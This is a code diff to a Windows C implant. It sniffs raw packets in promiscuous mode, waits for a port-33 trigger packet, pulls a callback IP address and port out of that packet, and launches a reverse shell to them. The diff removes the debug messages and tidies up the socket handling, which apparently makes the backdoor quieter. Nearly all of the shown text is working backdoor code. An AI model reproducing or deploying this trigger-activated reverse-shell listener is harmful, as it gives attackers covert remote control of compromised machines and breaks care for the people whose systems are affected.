@@ -88,7 +88,6 @@ reverse_shell(unsigned int IP_ADDR, unsigned short PORT)
 
 }
 
-
 /* Starts the Raw Socket Listener that waits for the specified
 	trigger mechanism. This then retrieves the callback info
 	and calls the reverse shell.*/
@@ -109,80 +108,37 @@ start_listener(void)
 
 	// Required in order to initialize and gain access to winsock.dll
 	wsaResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
-	if (wsaResult != 0) {
-
-#ifdef _DEBUG
-		{
-			printf("WSAStartup failed.\n");
-		}
-#endif
+	if (wsaResult != 0) 
 		return -1;
-	}
 
 	// create a raw socket 
 	sock = WSASocket(AF_INET, SOCK_RAW, IPPROTO_IP, NULL, 0, dwFlags);
-	if (sock == INVALID_SOCKET) {
-#ifdef _DEBUG
-		{
-		printf("Failed to created raw socket.\n");
-		}
-#endif
+	if (sock == INVALID_SOCKET) 
 		return -1;
-	}
 
 	sockaddr_in sniffer;
 	sniffer.sin_family = AF_INET;
 	sniffer.sin_port = htons(0);
 	sniffer.sin_addr.s_addr = inet_addr("192.168.1.134");
 
-	if (bind(sock, (SOCKADDR*)&sniffer, sizeof(sniffer)) == SOCKET_ERROR) {
-		printf("Error binding raw socket.\n");
-		printf("Error: %d\n", WSAGetLastError());
+	if (bind(sock, (SOCKADDR*)&sniffer, sizeof(sniffer)) == SOCKET_ERROR)
 		return -1;
-	}
-
-#ifdef _DEBUG
-	{
-		printf("Socket successfully bound to interface.\nAttempting promiscuous mode.\n");
-	}
-#endif
 
 	// this function sets the interface to promiscuous mode
-	if (WSAIoctl(sock,
-		SIO_RCVALL,
-		&optval,
-		sizeof(optval),
-		NULL,
-		0,
-		&dwLen,
-		NULL,
-		NULL) == SOCKET_ERROR)
-	{
-		printf("Error setting interface to promiscuous mode\n");
+	if (WSAIoctl(sock, SIO_RCVALL, &optval, sizeof(optval), NULL, 0, &dwLen, NULL, NULL) == SOCKET_ERROR)
 		goto close;
-	}
-
-#ifdef _DEBUG
-	{
-		printf("Going into sniffing mode\n");
-	}
-#endif
 
 	// allocate memory in the heap for handling each packet at a time
-	if ((packet = (char*)malloc(sizeof(char) * MAX_PACKET_SIZE)) == NULL) {
-		printf("Failed to allocate memory in the heap\n");
+	if ((packet = (char*)malloc(sizeof(char) * MAX_PACKET_SIZE)) == NULL)
 		goto close;
-	}
 
+	// enter listener while loop and call reverse_shell on trigger
 	while (TRUE)
 	{
 		memset(packet, 0x00, sizeof(MAX_PACKET_SIZE));
 
-		if (bytes = recv(sock, packet, MAX_PACKET_SIZE, 0) == SOCKET_ERROR) {
-			printf("Failed to received data\n");
-			printf("Error: %d\n", WSAGetLastError());
+		if (bytes = recv(sock, packet, MAX_PACKET_SIZE, 0) == SOCKET_ERROR) 
 			break;
-		}
 
 		ip_header = (IPHEADER*)packet;
 
@@ -192,19 +148,8 @@ start_listener(void)
 			int iphdr_len = (ip_header->ver_ihl & 0xf) * sizeof(DWORD);
 			tcp_hdr = (TCPHEADER*)(packet + iphdr_len);
 			
-#ifdef _DEBUG
-			{
-				printf("DPORT: %d\n", htons(tcp_hdr->dport));
-			}
-#endif
 			// Trigger based off of a source and destination port pairing
 			if (htons(tcp_hdr->dport) == 33 && htons(tcp_hdr->sport) == 33) {
-
-#ifdef _DEBUG
-				{
-					printf("Triggered!!\n");
-				}
-#endif
 
 				cdata = (struct CDATA*)(packet + iphdr_len + sizeof(TCPHEADER));
 
@@ -219,21 +164,21 @@ start_listener(void)
 				ip += (cdata->addr[0]);
 
 				free(packet);
+				shutdown(sock, SD_BOTH);
 				closesocket(sock);
 				reverse_shell(ip, port);
 
 				return 0;
 
 			}
-			
 		}
 	}
 	free(packet);
-	close:
+close:
+	shutdown(sock, SD_BOTH);
 	closesocket(sock);
 
 	return -1;
-    
 }
 
 int
